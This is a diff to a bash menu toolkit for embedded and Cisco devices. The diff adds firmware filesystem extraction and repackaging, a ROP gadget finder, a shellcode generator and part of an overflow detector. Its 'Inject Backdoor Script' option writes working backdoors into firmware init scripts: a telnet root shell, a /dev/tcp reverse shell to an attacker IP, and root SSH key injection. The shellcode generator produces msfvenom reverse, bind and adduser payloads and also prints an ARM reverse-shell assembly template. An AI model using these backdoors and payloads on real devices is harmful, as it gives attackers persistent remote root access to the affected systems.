@@ -1,9 +1,10 @@
 #!/usr/bin/env bash
-# Cisco & Generic Embedded Advanced Recovery Tool v2.8
+# Cisco & Generic Embedded Advanced Recovery Tool v2.9
 #
 # A TUI-based toolkit for automating password recovery, JTAG exploitation,
 # JTAG cable assisted recovery, firmware modification, advanced firmware analysis,
-# and bootloader development on Cisco and other embedded devices.
+# bootloader development, filesystem manipulation, exploit development, and live memory
+# manipulation on Cisco and other embedded devices.
 
 # Exit on error, undefined variable, or pipe failure
 set -euo pipefail
@@ -3388,6 +3389,1685 @@ menu_bootloader_devkit() {
 
 # --- End Bootloader Development Kit ---
 
+# --- Firmware Filesystem Tools ---
+
+firmware_fs_extract() {
+    print_header
+    echo "=== Firmware Filesystem Extractor ==="
+    echo
+    echo "Extract and analyze firmware filesystems:"
+    echo "  - Automatic filesystem detection"
+    echo "  - Support for squashfs, cramfs, jffs2, yaffs2"
+    echo "  - Full directory tree extraction"
+    echo "  - Automatic decompression"
+    echo
+
+    read -r -p "Enter path to firmware file: " firmware_file
+
+    if [ ! -f "$firmware_file" ]; then
+        echo "ERROR: File not found: $firmware_file"
+        read -r -p "Press Enter to continue..."
+        return 1
+    fi
+
+    local extract_dir="${SESSION_DIR}/extracted_$(basename "$firmware_file")_$(date +%s)"
+    mkdir -p "$extract_dir"
+
+    log_message "INFO" "Starting filesystem extraction: $firmware_file"
+
+    echo
+    echo ">>> Step 1/4: Scanning for Filesystems"
+    echo "---------------------------------------"
+    if command -v binwalk &> /dev/null; then
+        echo "Scanning firmware for embedded filesystems..."
+        binwalk "$firmware_file" | tee "$extract_dir/scan_results.txt"
+
+        local fs_count=$(grep -Ei '(squashfs|cramfs|jffs2|yaffs2|romfs|ext[234])' "$extract_dir/scan_results.txt" | wc -l)
+        echo
+        echo "Found $fs_count filesystem(s)"
+    else
+        echo "ERROR: binwalk is required for filesystem extraction"
+        echo "Install with: sudo apt-get install binwalk"
+        read -r -p "Press Enter to continue..."
+        return 1
+    fi
+
+    echo
+    echo ">>> Step 2/4: Extracting Filesystems"
+    echo "-------------------------------------"
+    echo "Extracting to: $extract_dir"
+    echo
+
+    cd "$extract_dir"
+    binwalk -e "$firmware_file" 2>&1 | tee extraction.log
+
+    echo
+    echo ">>> Step 3/4: Analyzing Extracted Files"
+    echo "----------------------------------------"
+
+    # Find the extracted directory
+    local extracted_root=$(find "$extract_dir" -type d -name "_${firmware_file##*/}.extracted" | head -1)
+
+    if [ -z "$extracted_root" ]; then
+        extracted_root=$(find "$extract_dir" -maxdepth 1 -type d ! -name "$(basename "$extract_dir")" | head -1)
+    fi
+
+    if [ -d "$extracted_root" ]; then
+        echo "Extracted filesystem root: $extracted_root"
+        echo
+        echo "Directory structure (top level):"
+        ls -lah "$extracted_root" 2>/dev/null | head -30
+
+        echo
+        echo "Total files extracted:"
+        find "$extracted_root" -type f | wc -l
+
+        echo
+        echo "File types breakdown:"
+        find "$extracted_root" -type f -exec file {} \; 2>/dev/null | cut -d: -f2 | sort | uniq -c | sort -rn | head -15
+    else
+        echo "WARNING: Could not locate extracted filesystem root"
+    fi
+
+    echo
+    echo ">>> Step 4/4: Security Quick Scan"
+    echo "----------------------------------"
+    if [ -d "$extracted_root" ]; then
+        echo "Searching for interesting files..."
+
+        # SUID binaries
+        local suid_files=$(find "$extracted_root" -type f -perm -4000 2>/dev/null | wc -l)
+        echo "  SUID binaries: $suid_files"
+        if [ $suid_files -gt 0 ]; then
+            find "$extracted_root" -type f -perm -4000 2>/dev/null | head -10 | sed 's/^/    /'
+        fi
+
+        # Configuration files
+        echo "  Configuration files (.conf, .cfg, .xml, .json):"
+        find "$extracted_root" -type f \( -name "*.conf" -o -name "*.cfg" -o -name "*.xml" -o -name "*.json" \) 2>/dev/null | wc -l
+
+        # Scripts
+        echo "  Shell scripts:"
+        find "$extracted_root" -type f -name "*.sh" 2>/dev/null | wc -l
+
+        # Credentials search
+        echo
+        echo "  Quick credential search (top 5 results):"
+        grep -r -Ei '(password|passwd|secret|key)' "$extracted_root" 2>/dev/null | head -5 | cut -c1-100 | sed 's/^/    /'
+    fi
+
+    echo
+    echo "========================================="
+    echo "Extraction Complete!"
+    echo "========================================="
+    echo "Extraction directory: $extract_dir"
+    if [ -d "$extracted_root" ]; then
+        echo "Filesystem root: $extracted_root"
+    fi
+    echo
+
+    # Save extraction info
+    cat > "$extract_dir/EXTRACTION_INFO.txt" <<EOF
+Firmware File: $firmware_file
+Extraction Date: $(date)
+Extraction Directory: $extract_dir
+Filesystem Root: $extracted_root
+
+To browse the filesystem:
+  cd "$extracted_root"
+
+To modify files:
+  Use the Firmware Filesystem Modifier menu option
+
+To repackage:
+  Use the Firmware Filesystem Repackager menu option
+EOF
+
+    log_message "INFO" "Filesystem extraction completed: $extract_dir"
+
+    read -r -p "Press Enter to continue..."
+}
+
+firmware_fs_modify() {
+    print_header
+    echo "=== Firmware Filesystem Modifier ==="
+    echo
+    echo "Modify files within an extracted firmware filesystem:"
+    echo "  - Edit configuration files"
+    echo "  - Replace binaries"
+    echo "  - Add/remove files"
+    echo "  - Modify scripts"
+    echo
+
+    read -r -p "Enter path to extracted filesystem root: " fs_root
+
+    if [ ! -d "$fs_root" ]; then
+        echo "ERROR: Directory not found: $fs_root"
+        read -r -p "Press Enter to continue..."
+        return 1
+    fi
+
+    log_message "INFO" "Starting filesystem modification: $fs_root"
+
+    while true; do
+        print_header
+        echo "=== Filesystem Modifier - $(basename "$fs_root") ==="
+        echo
+        echo "Filesystem: $fs_root"
+        echo
+        echo "  1) Browse Filesystem"
+        echo "  2) Edit File (Text Editor)"
+        echo "  3) Replace Binary/File"
+        echo "  4) Add New File"
+        echo "  5) Delete File"
+        echo "  6) Modify Permissions/Ownership"
+        echo "  7) Search for Files"
+        echo "  8) Inject Backdoor Script"
+        echo "  9) Modify Init Scripts"
+        echo "  b) Back"
+        echo
+        read -r -p "Choose an option: " choice
+
+        case "$choice" in
+            1)
+                echo
+                echo "--- Browse Filesystem ---"
+                echo "Current directory: $fs_root"
+                echo
+                ls -lah "$fs_root" 2>/dev/null
+                echo
+                read -r -p "Enter subdirectory to browse (or press Enter to skip): " subdir
+                if [ -n "$subdir" ] && [ -d "$fs_root/$subdir" ]; then
+                    ls -lah "$fs_root/$subdir" 2>/dev/null
+                fi
+                echo
+                read -r -p "Press Enter to continue..."
+                ;;
+            2)
+                echo
+                echo "--- Edit File ---"
+                read -r -p "Enter path to file (relative to $fs_root): " file_path
+
+                local full_path="$fs_root/$file_path"
+
+                if [ ! -f "$full_path" ]; then
+                    echo "ERROR: File not found: $full_path"
+                else
+                    # Backup original
+                    cp "$full_path" "${full_path}.backup"
+                    echo "Backup created: ${full_path}.backup"
+
+                    # Try to use available editors
+                    if command -v nano &> /dev/null; then
+                        nano "$full_path"
+                    elif command -v vi &> /dev/null; then
+                        vi "$full_path"
+                    else
+                        echo "No text editor available (nano/vi)"
+                        echo "File contents:"
+                        cat "$full_path"
+                    fi
+
+                    log_message "INFO" "Modified file: $full_path"
+                fi
+                read -r -p "Press Enter to continue..."
+                ;;
+            3)
+                echo
+                echo "--- Replace Binary/File ---"
+                read -r -p "Enter path to file to replace (relative to $fs_root): " target_file
+                read -r -p "Enter path to replacement file: " source_file
+
+                local target_path="$fs_root/$target_file"
+
+                if [ ! -f "$source_file" ]; then
+                    echo "ERROR: Source file not found: $source_file"
+                elif [ ! -f "$target_path" ]; then
+                    echo "ERROR: Target file not found: $target_path"
+                else
+                    # Backup original
+                    cp "$target_path" "${target_path}.backup"
+                    echo "Backup created: ${target_path}.backup"
+
+                    # Replace file
+                    cp "$source_file" "$target_path"
+                    echo "SUCCESS: File replaced"
+
+                    log_message "INFO" "Replaced file: $target_path with $source_file"
+                fi
+                read -r -p "Press Enter to continue..."
+                ;;
+            4)
+                echo
+                echo "--- Add New File ---"
+                read -r -p "Enter source file path: " source_file
+                read -r -p "Enter destination path (relative to $fs_root): " dest_path
+
+                local full_dest="$fs_root/$dest_path"
+
+                if [ ! -f "$source_file" ]; then
+                    echo "ERROR: Source file not found: $source_file"
+                else
+                    # Create directory if needed
+                    mkdir -p "$(dirname "$full_dest")"
+
+                    cp "$source_file" "$full_dest"
+                    echo "SUCCESS: File added at $full_dest"
+
+                    log_message "INFO" "Added file: $full_dest"
+                fi
+                read -r -p "Press Enter to continue..."
+                ;;
+            5)
+                echo
+                echo "--- Delete File ---"
+                echo "WARNING: This will permanently delete the file!"
+                read -r -p "Enter path to file (relative to $fs_root): " file_path
+
+                local full_path="$fs_root/$file_path"
+
+                if [ ! -f "$full_path" ]; then
+                    echo "ERROR: File not found: $full_path"
+                else
+                    read -r -p "Are you sure you want to delete $file_path? (yes/no): " confirm
+                    if [ "$confirm" = "yes" ]; then
+                        rm "$full_path"
+                        echo "SUCCESS: File deleted"
+                        log_message "INFO" "Deleted file: $full_path"
+                    else
+                        echo "Cancelled"
+                    fi
+                fi
+                read -r -p "Press Enter to continue..."
+                ;;
+            6)
+                echo
+                echo "--- Modify Permissions/Ownership ---"
+                read -r -p "Enter path to file (relative to $fs_root): " file_path
+
+                local full_path="$fs_root/$file_path"
+
+                if [ ! -e "$full_path" ]; then
+                    echo "ERROR: File not found: $full_path"
+                else
+                    echo "Current permissions:"
+                    ls -l "$full_path"
+                    echo
+                    echo "  1) Make executable (+x)"
+                    echo "  2) Set SUID bit (u+s)"
+                    echo "  3) Custom chmod"
+                    echo "  4) Custom chown"
+                    echo
+                    read -r -p "Choose option: " perm_choice
+
+                    case "$perm_choice" in
+                        1)
+                            chmod +x "$full_path"
+                            echo "SUCCESS: Made executable"
+                            ;;
+                        2)
+                            chmod u+s "$full_path"
+                            echo "SUCCESS: SUID bit set"
+                            ;;
+                        3)
+                            read -r -p "Enter chmod value (e.g., 755): " chmod_val
+                            chmod "$chmod_val" "$full_path"
+                            echo "SUCCESS: Permissions set to $chmod_val"
+                            ;;
+                        4)
+                            read -r -p "Enter owner:group (e.g., root:root): " own_val
+                            chown "$own_val" "$full_path" 2>/dev/null || echo "Note: May require root privileges"
+                            echo "SUCCESS: Ownership set to $own_val"
+                            ;;
+                    esac
+
+                    echo "New permissions:"
+                    ls -l "$full_path"
+
+                    log_message "INFO" "Modified permissions: $full_path"
+                fi
+                read -r -p "Press Enter to continue..."
+                ;;
+            7)
+                echo
+                echo "--- Search for Files ---"
+                read -r -p "Enter filename pattern (e.g., *.conf): " pattern
+                echo
+                echo "Searching for: $pattern"
+                find "$fs_root" -name "$pattern" -type f 2>/dev/null
+                echo
+                read -r -p "Press Enter to continue..."
+                ;;
+            8)
+                echo
+                echo "--- Inject Backdoor Script ---"
+                echo "WARNING: This creates a backdoor for authorized testing only!"
+                echo
+                echo "  1) Telnet backdoor (port 6666)"
+                echo "  2) Reverse shell backdoor"
+                echo "  3) SSH key injection"
+                echo "  4) Custom script"
+                echo
+                read -r -p "Choose backdoor type: " backdoor_choice
+
+                local backdoor_script="$fs_root/etc/init.d/backdoor"
+
+                case "$backdoor_choice" in
+                    1)
+                        mkdir -p "$fs_root/etc/init.d"
+                        cat > "$backdoor_script" <<'BACKDOOR_EOF'
+#!/bin/sh
+# Telnet backdoor - authorized testing only
+/usr/sbin/telnetd -p 6666 -l /bin/sh
+BACKDOOR_EOF
+                        chmod +x "$backdoor_script"
+                        echo "SUCCESS: Telnet backdoor created at $backdoor_script"
+                        echo "         Listens on port 6666"
+                        ;;
+                    2)
+                        read -r -p "Enter attacker IP: " attacker_ip
+                        read -r -p "Enter attacker port: " attacker_port
+                        mkdir -p "$fs_root/etc/init.d"
+                        cat > "$backdoor_script" <<BACKDOOR_EOF
+#!/bin/sh
+# Reverse shell backdoor - authorized testing only
+/bin/sh -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1 &
+BACKDOOR_EOF
+                        chmod +x "$backdoor_script"
+                        echo "SUCCESS: Reverse shell backdoor created"
+                        echo "         Connects to $attacker_ip:$attacker_port"
+                        ;;
+                    3)
+                        read -r -p "Enter path to your SSH public key: " pubkey_file
+                        if [ -f "$pubkey_file" ]; then
+                            mkdir -p "$fs_root/root/.ssh"
+                            cat "$pubkey_file" >> "$fs_root/root/.ssh/authorized_keys"
+                            chmod 600 "$fs_root/root/.ssh/authorized_keys"
+                            echo "SUCCESS: SSH key injected for root user"
+                        else
+                            echo "ERROR: Public key file not found"
+                        fi
+                        ;;
+                    4)
+                        read -r -p "Enter path to custom backdoor script: " custom_script
+                        if [ -f "$custom_script" ]; then
+                            mkdir -p "$fs_root/etc/init.d"
+                            cp "$custom_script" "$backdoor_script"
+                            chmod +x "$backdoor_script"
+                            echo "SUCCESS: Custom backdoor installed"
+                        else
+                            echo "ERROR: Script file not found"
+                        fi
+                        ;;
+                esac
+
+                log_message "WARNING" "Backdoor injected (authorized testing): $backdoor_script"
+                read -r -p "Press Enter to continue..."
+                ;;
+            9)
+                echo
+                echo "--- Modify Init Scripts ---"
+                echo "Common init script locations:"
+                echo
+
+                if [ -d "$fs_root/etc/init.d" ]; then
+                    echo "  /etc/init.d:"
+                    ls "$fs_root/etc/init.d" 2>/dev/null | head -10
+                fi
+
+                if [ -d "$fs_root/etc/rc.d" ]; then
+                    echo "  /etc/rc.d:"
+                    ls "$fs_root/etc/rc.d" 2>/dev/null | head -10
+                fi
+
+                echo
+                read -r -p "Enter init script to edit (e.g., etc/init.d/rcS): " init_script
+
+                local full_path="$fs_root/$init_script"
+
+                if [ -f "$full_path" ]; then
+                    cp "$full_path" "${full_path}.backup"
+                    echo "Backup created: ${full_path}.backup"
+
+                    if command -v nano &> /dev/null; then
+                        nano "$full_path"
+                    elif command -v vi &> /dev/null; then
+                        vi "$full_path"
+                    else
+                        echo "No text editor available"
+                    fi
+
+                    log_message "INFO" "Modified init script: $full_path"
+                else
+                    echo "ERROR: Init script not found: $full_path"
+                fi
+                read -r -p "Press Enter to continue..."
+                ;;
+            b)
+                echo "Filesystem modifications complete"
+                return 0
+                ;;
+            *)
+                echo "Invalid option."
+                sleep 1
+                ;;
+        esac
+    done
+}
+
+firmware_fs_repackage() {
+    print_header
+    echo "=== Firmware Filesystem Repackager ==="
+    echo
+    echo "Repackage modified filesystem into firmware image:"
+    echo "  - SquashFS support (mksquashfs)"
+    echo "  - JFFS2 support (mkfs.jffs2)"
+    echo "  - CPIO archive support"
+    echo "  - Custom compression options"
+    echo
+
+    read -r -p "Enter path to filesystem root directory: " fs_root
+
+    if [ ! -d "$fs_root" ]; then
+        echo "ERROR: Directory not found: $fs_root"
+        read -r -p "Press Enter to continue..."
+        return 1
+    fi
+
+    log_message "INFO" "Starting filesystem repackaging: $fs_root"
+
+    echo
+    echo "Select filesystem type:"
+    echo "  1) SquashFS (most common)"
+    echo "  2) JFFS2"
+    echo "  3) CPIO archive"
+    echo "  4) TAR archive"
+    echo
+    read -r -p "Choose filesystem type: " fs_type
+
+    local output_file="${SESSION_DIR}/repacked_$(basename "$fs_root")_$(date +%s)"
+
+    case "$fs_type" in
+        1)
+            echo
+            echo "--- SquashFS Repackaging ---"
+
+            if ! command -v mksquashfs &> /dev/null; then
+                echo "ERROR: mksquashfs not found"
+                echo "Install with: sudo apt-get install squashfs-tools"
+                read -r -p "Press Enter to continue..."
+                return 1
+            fi
+
+            output_file="${output_file}.squashfs"
+
+            echo "Compression options:"
+            echo "  1) gzip (default)"
+            echo "  2) lzma (better compression)"
+            echo "  3) xz (best compression)"
+            echo "  4) lzo (fastest)"
+            echo
+            read -r -p "Choose compression: " comp_choice
+
+            local comp_type="gzip"
+            case "$comp_choice" in
+                2) comp_type="lzma" ;;
+                3) comp_type="xz" ;;
+                4) comp_type="lzo" ;;
+            esac
+
+            echo
+            echo "Creating SquashFS image with $comp_type compression..."
+            mksquashfs "$fs_root" "$output_file" -comp "$comp_type" -noappend 2>&1 | tee "${output_file}.log"
+
+            if [ -f "$output_file" ]; then
+                echo
+                echo "SUCCESS: SquashFS image created"
+                echo "Output: $output_file"
+                echo "Size: $(stat -c%s "$output_file" 2>/dev/null || stat -f%z "$output_file" 2>/dev/null) bytes"
+                log_message "INFO" "Created SquashFS: $output_file"
+            else
+                echo "ERROR: Failed to create SquashFS image"
+            fi
+            ;;
+        2)
+            echo
+            echo "--- JFFS2 Repackaging ---"
+
+            if ! command -v mkfs.jffs2 &> /dev/null; then
+                echo "ERROR: mkfs.jffs2 not found"
+                echo "Install with: sudo apt-get install mtd-utils"
+                read -r -p "Press Enter to continue..."
+                return 1
+            fi
+
+            output_file="${output_file}.jffs2"
+
+            read -r -p "Enter erase block size in KB (default 64): " erase_size
+            erase_size=${erase_size:-64}
+
+            read -r -p "Enter page size (default 2048): " page_size
+            page_size=${page_size:-2048}
+
+            echo
+            echo "Creating JFFS2 image..."
+            mkfs.jffs2 -r "$fs_root" -o "$output_file" -e "${erase_size}KiB" -s "$page_size" -n 2>&1 | tee "${output_file}.log"
+
+            if [ -f "$output_file" ]; then
+                echo
+                echo "SUCCESS: JFFS2 image created"
+                echo "Output: $output_file"
+                echo "Size: $(stat -c%s "$output_file" 2>/dev/null || stat -f%z "$output_file" 2>/dev/null) bytes"
+                log_message "INFO" "Created JFFS2: $output_file"
+            else
+                echo "ERROR: Failed to create JFFS2 image"
+            fi
+            ;;
+        3)
+            echo
+            echo "--- CPIO Archive ---"
+            output_file="${output_file}.cpio.gz"
+
+            echo "Creating CPIO archive..."
+            cd "$fs_root"
+            find . | cpio -o -H newc 2>/dev/null | gzip > "$output_file"
+
+            if [ -f "$output_file" ]; then
+                echo
+                echo "SUCCESS: CPIO archive created"
+                echo "Output: $output_file"
+                echo "Size: $(stat -c%s "$output_file" 2>/dev/null || stat -f%z "$output_file" 2>/dev/null) bytes"
+                log_message "INFO" "Created CPIO: $output_file"
+            else
+                echo "ERROR: Failed to create CPIO archive"
+            fi
+            ;;
+        4)
+            echo
+            echo "--- TAR Archive ---"
+            output_file="${output_file}.tar.gz"
+
+            echo "Creating TAR archive..."
+            tar -czf "$output_file" -C "$fs_root" . 2>&1
+
+            if [ -f "$output_file" ]; then
+                echo
+                echo "SUCCESS: TAR archive created"
+                echo "Output: $output_file"
+                echo "Size: $(stat -c%s "$output_file" 2>/dev/null || stat -f%z "$output_file" 2>/dev/null) bytes"
+                log_message "INFO" "Created TAR: $output_file"
+            else
+                echo "ERROR: Failed to create TAR archive"
+            fi
+            ;;
+        *)
+            echo "Invalid option"
+            read -r -p "Press Enter to continue..."
+            return 1
+            ;;
+    esac
+
+    echo
+    echo "Repackaging complete!"
+    echo "Modified filesystem image: $output_file"
+    echo
+    echo "Next steps:"
+    echo "  - Flash this image via JTAG (Firmware Manipulation menu)"
+    echo "  - Or integrate into full firmware update package"
+    echo
+
+    read -r -p "Press Enter to continue..."
+}
+
+menu_firmware_filesystem_tools() {
+    while true; do
+        print_header
+        echo "--- Firmware Filesystem Tools ---"
+        echo
+        echo "  1) Extract Filesystem from Firmware"
+        echo "     (Auto-detect and extract squashfs, jffs2, cramfs, etc.)"
+        echo
+        echo "  2) Modify Extracted Filesystem"
+        echo "     (Edit configs, replace binaries, inject backdoors)"
+        echo
+        echo "  3) Repackage Filesystem"
+        echo "     (Rebuild filesystem image for flashing)"
+        echo
+        echo "  b) Back to Main Menu"
+        echo
+        read -r -p "Choose an option: " choice
+
+        case "$choice" in
+            1) firmware_fs_extract ;;
+            2) firmware_fs_modify ;;
+            3) firmware_fs_repackage ;;
+            b) break ;;
+            *) echo "Invalid option." && sleep 1 ;;
+        esac
+    done
+}
+
+# --- End Firmware Filesystem Tools ---
+
+# --- Automated Exploit Development Tools ---
+
+exploit_rop_gadget_finder() {
+    print_header
+    echo "=== ROP Gadget Finder ==="
+    echo
+    echo "Find Return-Oriented Programming (ROP) gadgets in binaries:"
+    echo "  - Automatic gadget discovery"
+    echo "  - Gadget filtering by instruction type"
+    echo "  - Address and offset information"
+    echo
+
+    read -r -p "Enter path to binary/firmware file: " binary_file
+
+    if [ ! -f "$binary_file" ]; then
+        echo "ERROR: File not found: $binary_file"
+        read -r -p "Press Enter to continue..."
+        return 1
+    fi
+
+    local output_dir="${SESSION_DIR}/rop_gadgets_$(basename "$binary_file")_$(date +%s)"
+    mkdir -p "$output_dir"
+
+    log_message "INFO" "Starting ROP gadget search: $binary_file"
+
+    echo
+    echo ">>> Searching for ROP Gadgets"
+    echo "------------------------------"
+
+    if command -v ROPgadget &> /dev/null || command -v ropgadget &> /dev/null; then
+        local rop_cmd="ROPgadget"
+        command -v ROPgadget &> /dev/null || rop_cmd="ropgadget"
+
+        echo "Using $rop_cmd to find gadgets..."
+        $rop_cmd --binary "$binary_file" > "$output_dir/all_gadgets.txt" 2>&1
+
+        local gadget_count=$(grep -c '^0x' "$output_dir/all_gadgets.txt" 2>/dev/null || echo 0)
+        echo "Found $gadget_count gadgets"
+        echo "Full list: $output_dir/all_gadgets.txt"
+
+        # Extract useful gadget categories
+        echo
+        echo "Categorizing gadgets..."
+        grep 'pop.*; ret' "$output_dir/all_gadgets.txt" > "$output_dir/pop_ret.txt" 2>/dev/null || true
+        grep 'mov.*; ret' "$output_dir/all_gadgets.txt" > "$output_dir/mov_ret.txt" 2>/dev/null || true
+        grep 'call' "$output_dir/all_gadgets.txt" > "$output_dir/call.txt" 2>/dev/null || true
+        grep 'jmp' "$output_dir/all_gadgets.txt" > "$output_dir/jmp.txt" 2>/dev/null || true
+
+        echo "  pop/ret gadgets: $(wc -l < "$output_dir/pop_ret.txt") → $output_dir/pop_ret.txt"
+        echo "  mov/ret gadgets: $(wc -l < "$output_dir/mov_ret.txt") → $output_dir/mov_ret.txt"
+        echo "  call gadgets: $(wc -l < "$output_dir/call.txt") → $output_dir/call.txt"
+        echo "  jmp gadgets: $(wc -l < "$output_dir/jmp.txt") → $output_dir/jmp.txt"
+
+        echo
+        echo "Useful pop/ret gadgets (first 20):"
+        head -20 "$output_dir/pop_ret.txt" 2>/dev/null | sed 's/^/  /'
+
+    else
+        echo "ERROR: ROPgadget not installed"
+        echo "Install with: pip install ROPgadget"
+        echo
+        echo "Attempting manual gadget search..."
+
+        if command -v objdump &> /dev/null; then
+            echo "Using objdump for basic gadget discovery..."
+            objdump -d "$binary_file" | grep -E '(ret|pop|mov|call|jmp)' > "$output_dir/disasm_gadgets.txt" 2>&1
+            echo "Disassembly saved to: $output_dir/disasm_gadgets.txt"
+        else
+            echo "ERROR: Neither ROPgadget nor objdump available"
+        fi
+    fi
+
+    echo
+    echo "========================================="
+    echo "ROP Gadget Search Complete!"
+    echo "========================================="
+    echo "Output directory: $output_dir"
+
+    log_message "INFO" "ROP gadget search completed: $output_dir"
+    read -r -p "Press Enter to continue..."
+}
+
+exploit_shellcode_generator() {
+    print_header
+    echo "=== Shellcode Generator ==="
+    echo
+    echo "Generate shellcode for various architectures and payloads"
+    echo
+
+    echo "Select target architecture:"
+    echo "  1) ARM (armle)"
+    echo "  2) MIPS (mipsle)"
+    echo "  3) x86"
+    echo "  4) x86_64"
+    echo
+    read -r -p "Choose architecture: " arch_choice
+
+    local arch=""
+    case "$arch_choice" in
+        1) arch="armle" ;;
+        2) arch="mipsle" ;;
+        3) arch="x86" ;;
+        4) arch="x86_64" ;;
+        *) echo "Invalid choice" && return 1 ;;
+    esac
+
+    echo
+    echo "Select payload type:"
+    echo "  1) Reverse shell (connect-back)"
+    echo "  2) Bind shell (listen)"
+    echo "  3) Exec command"
+    echo "  4) Add user (root)"
+    echo
+    read -r -p "Choose payload: " payload_choice
+
+    local output_file="${SESSION_DIR}/shellcode_${arch}_$(date +%s).bin"
+
+    case "$payload_choice" in
+        1)
+            read -r -p "Enter LHOST (attacker IP): " lhost
+            read -r -p "Enter LPORT (attacker port): " lport
+
+            echo
+            echo "Generating reverse shell shellcode for $arch..."
+
+            if command -v msfvenom &> /dev/null; then
+                msfvenom -p linux/$arch/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f raw > "$output_file" 2>&1
+                msfvenom -p linux/$arch/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f c >> "${output_file}.c" 2>&1
+                msfvenom -p linux/$arch/shell_reverse_tcp LHOST="$lhost" LPORT="$lport" -f python >> "${output_file}.py" 2>&1
+
+                echo "SUCCESS: Shellcode generated"
+                echo "  Binary: $output_file"
+                echo "  C format: ${output_file}.c"
+                echo "  Python format: ${output_file}.py"
+                echo
+                echo "C code preview:"
+                head -20 "${output_file}.c"
+            else
+                echo "ERROR: msfvenom not installed"
+                echo "Install Metasploit Framework for shellcode generation"
+                echo
+                echo "Manual ARM reverse shell shellcode template:"
+                cat > "${output_file}_manual.s" <<'EOF'
+.section .text
+.global _start
+_start:
+    // socket(AF_INET, SOCK_STREAM, 0)
+    mov r0, #2
+    mov r1, #1
+    eor r2, r2, r2
+    mov r7, #281
+    svc #0
+    mov r4, r0
+
+    // connect(sock, &addr, 16)
+    adr r1, addr
+    mov r2, #16
+    mov r7, #283
+    svc #0
+
+    // dup2(sock, 0/1/2)
+    mov r0, r4
+    mov r1, #0
+    mov r7, #63
+    svc #0
+    mov r1, #1
+    svc #0
+    mov r1, #2
+    svc #0
+
+    // execve("/bin/sh", NULL, NULL)
+    adr r0, shell
+    eor r1, r1, r1
+    eor r2, r2, r2
+    mov r7, #11
+    svc #0
+
+addr:
+    .short 2
+    .short 0x1234  // port (change to target port in network byte order)
+    .byte 192, 168, 1, 1  // IP address
+shell:
+    .asciz "/bin/sh"
+EOF
+                echo "Template saved to: ${output_file}_manual.s"
+                echo "Customize the IP and port, then assemble with: arm-linux-gnueabi-as"
+            fi
+            ;;
+        2)
+            read -r -p "Enter bind port: " bind_port
+
+            echo
+            echo "Generating bind shell shellcode for $arch..."
+
+            if command -v msfvenom &> /dev/null; then
+                msfvenom -p linux/$arch/shell_bind_tcp LPORT="$bind_port" -f raw > "$output_file" 2>&1
+                msfvenom -p linux/$arch/shell_bind_tcp LPORT="$bind_port" -f c >> "${output_file}.c" 2>&1
+
+                echo "SUCCESS: Bind shell shellcode generated"
+                echo "  Binary: $output_file"
+                echo "  C format: ${output_file}.c"
+            else
+                echo "ERROR: msfvenom not installed"
+            fi
+            ;;
+        3)
+            read -r -p "Enter command to execute: " exec_cmd
+
+            echo
+            echo "Generating exec shellcode for $arch..."
+
+            if command -v msfvenom &> /dev/null; then
+                msfvenom -p linux/$arch/exec CMD="$exec_cmd" -f raw > "$output_file" 2>&1
+                msfvenom -p linux/$arch/exec CMD="$exec_cmd" -f c >> "${output_file}.c" 2>&1
+
+                echo "SUCCESS: Exec shellcode generated"
+                echo "  Binary: $output_file"
+                echo "  C format: ${output_file}.c"
+            else
+                echo "ERROR: msfvenom not installed"
+            fi
+            ;;
+        4)
+            read -r -p "Enter username to add: " new_user
+            read -r -p "Enter password: " new_pass
+
+            echo
+            echo "Generating adduser shellcode for $arch..."
+
+            if command -v msfvenom &> /dev/null; then
+                msfvenom -p linux/$arch/adduser USER="$new_user" PASS="$new_pass" -f raw > "$output_file" 2>&1
+                msfvenom -p linux/$arch/adduser USER="$new_user" PASS="$new_pass" -f c >> "${output_file}.c" 2>&1
+
+                echo "SUCCESS: Add user shellcode generated"
+                echo "  Binary: $output_file"
+                echo "  C format: ${output_file}.c"
+            else
+                echo "ERROR: msfvenom not installed"
+            fi
+            ;;
+    esac
+
+    echo
+    log_message "INFO" "Shellcode generated for $arch: $output_file"
+    read -r -p "Press Enter to continue..."
+}
+
+exploit_buffer_overflow_detector() {
+    print_header
+    echo "=== Buffer Overflow Vulnerability Detector ==="
+    echo
+    echo "Analyze binaries for buffer overflow vulnerabilities:"
+    echo "  - Dangerous function usage"
+    echo "  - Stack protection analysis"
+    echo "  - ASLR/PIE/NX detection"
+    echo "  - Format string vulnerabilities"
+    echo
+
+    read -r -p "Enter path to binary: " binary_file
+
+    if [ ! -f "$binary_file" ]; then
+        echo "ERROR: File not found: $binary_file"
+        read -r -p "Press Enter to continue..."
+        return 1
+    fi
+
+    local report_file="${SESSION_DIR}/vuln_report_$(basename "$binary_file")_$(date +%s).txt"
+
+    log_message "INFO" "Starting vulnerability analysis: $binary_file"
+
+    echo
+    echo ">>> Analysis 1/5: Binary Security Features"
+    echo "-------------------------------------------"
+
+    if command -v checksec &> /dev/null; then
+        checksec --file="$binary_file" | tee -a "$report_file"
+    else
+        echo "checksec not available, using manual checks..."
+
+        if command -v readelf &> /dev/null; then
+            echo "Stack Canary:"
+            readelf -s "$binary_file" | grep -q '__stack_chk_fail' && echo "  YES - Stack canary enabled" || echo "  NO - No stack protection"
+
+            echo "NX (Non-Executable Stack):"
+            readelf -l "$binary_file" | grep -q 'GNU_STACK.*RWE' && echo "  NO - Stack is executable!" || echo "  YES - Stack is non-executable"
+
+            echo "PIE (Position Independent Executable):"
+            readelf -h "$binary_file" | grep -q 'DYN' && echo "  YES - PIE enabled" || echo "  NO - Not PIE"
+
+            echo "RELRO:"
+            readelf -l "$binary_file" | grep -q 'GNU_RELRO' && echo "  Partial RELRO" || echo "  NO RELRO"
+        else
+            echo "readelf not available"
+        fi
+    fi
+
+    echo
+    echo ">>> Analysis 2/5: Dangerous Functions"
+    echo "--------------------------------------"
+
+    if command -v objdump &> /dev/null; then
+        echo "Checking for dangerous function calls..."
+
+        local dangerous_funcs=$(objdump -T "$binary_file" 2>/dev/null | grep -Eo '\b(strcpy|strcat|gets|scanf|sprintf|vsprintf|strncpy|strncat)\b' | sort -u)
+
+        if [ -n "$dangerous_funcs" ]; then
+            echo "WARNING: Found dangerous functions:"
+            echo "$dangerous_funcs" | sed 's/^/  - /'
+        else
+            echo "OK: No obvious dangerous functions found"
+        fi
+    fi
+
+    echo
+    echo ">>> Analysis 3/5: Format String Vulnerabilities"
+    echo "------------------------------------------------"
+
+    if command -v strings &> /dev/null; then
+        echo "Searching for format string patterns..."
+
